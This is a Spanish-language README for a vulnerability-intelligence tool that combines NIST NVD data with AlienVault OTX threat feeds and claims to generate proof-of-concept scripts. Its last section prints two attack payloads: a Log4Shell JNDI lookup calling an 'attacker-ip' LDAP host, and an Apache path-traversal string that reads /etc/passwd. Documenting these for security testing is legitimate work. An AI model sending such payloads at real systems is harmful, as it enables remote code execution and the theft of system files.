1. DESCRIPCIÓN GENERAL
--------------------------------------------------------------------------------
Vamp-CVE-Oracle Ultimate es una herramienta avanzada de inteligencia de 
vulnerabilidades diseñada para analistas de seguridad y operadores de Red Team. 
Fusiona datos técnicos estáticos de la NIST National Vulnerability Database (NVD) 
con inteligencia de amenazas activa en tiempo real de AlienVault OTX.

CARACTERÍSTICAS PRINCIPALES:
- Sincronización Global: Consulta directa a la API de NIST (NVD).
- Radar de Amenazas: Identificación de pulsos de actividad y grupos de APT 
  usando la API de AlienVault OTX.
- Motor Quick-Strike: Generación heurística de scripts de Prueba de Concepto 
  (PoC) funcionales.
- Reportes Regionales: Generación de informes documentados con detección de 
  zona horaria local (ISO-8601).
- Optimización ARM64: Específicamente adaptado para laboratorios en Apple 
  Silicon (Mac M3) mediante Docker.

2. REQUISITOS Y DESPLIEGUE
--------------------------------------------------------------------------------
Arquitectura: ARM64 (Apple Silicon M1/M2/M3) o x86_64.
Lenguaje: Python 3.10+
Dependencias: requests, textwrap, datetime

CONFIGURACIÓN DE DOCKER (Mac M3):
Para asegurar la sincronización horaria regional y los permisos de red, su 
archivo docker-compose.yaml debe incluir:

services:
  python-tester:
    platform: linux/arm64/v8
    cap_add:
      - NET_ADMIN
    volumes:
      - .:/app
      - /etc/localtime:/etc/localtime:ro
      - /etc/timezone:/etc/timezone:ro

3. MANUAL DE USO
--------------------------------------------------------------------------------
Comando base:
python scripts/cve_oracle/vamp_cve_oracle.py [CVE-ID] [OPCIONES]

Argumentos:
  CVE-ID                Identificador de la vulnerabilidad (Ej: CVE-2021-44228)
  -o, --output RUTA     Ruta para exportar el reporte técnico (Ej: -o report.txt)

Ejemplo de ejecución en laboratorio:
docker exec -it vamp_python_lab python scripts/cve_oracle/vamp_cve_oracle.py \
CVE-2021-41773 -o reports/vulnerability_analysis.txt

4. FUNDAMENTOS TÉCNICOS Y FÓRMULAS
--------------------------------------------------------------------------------
A. SISTEMA DE PUNTUACIÓN CVSS v3.1
La herramienta reporta la severidad basada en el Common Vulnerability Scoring 
System. La puntuación base se calcula mediante la fórmula:

Score = Roundup(Minimum[(Impact + Exploitability), 10])

Donde el Impacto (CIA) mide la pérdida de Confidencialidad, Integridad y 
Disponibilidad de los datos.

B. ANÁLISIS DE INTELIGENCIA (OTX)
El radar de amenazas mide la prioridad de parcheo mediante la densidad de 
pulsos. Un "Pulso" en AlienVault OTX representa un informe verificado de 
actividad maliciosa en el mundo real.

C. LÓGICA QUICK-STRIKE (PoC)
El motor analiza la descripción técnica buscando patrones de:
- Path Traversal: Busca anomalías de normalización de rutas (LFI).
- JNDI/Injection: Detecta vectores de carga remota de clases (Log4Shell).
- RCE: Identifica fallos que permiten la ejecución de comandos de sistema.

5. EJEMPLOS DE ESTRATEGIAS PoC GENERADAS
--------------------------------------------------------------------------------
CVE-2021-44228 (Log4Shell):
Genera una estrategia de JNDI Lookup Injection:
Payload: ${jndi:ldap://attacker-ip:1389/Exploit}

CVE-2021-41773 (Apache Path Traversal):
Genera un script de "Quick Strike" para lectura de archivos:
Payload: /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
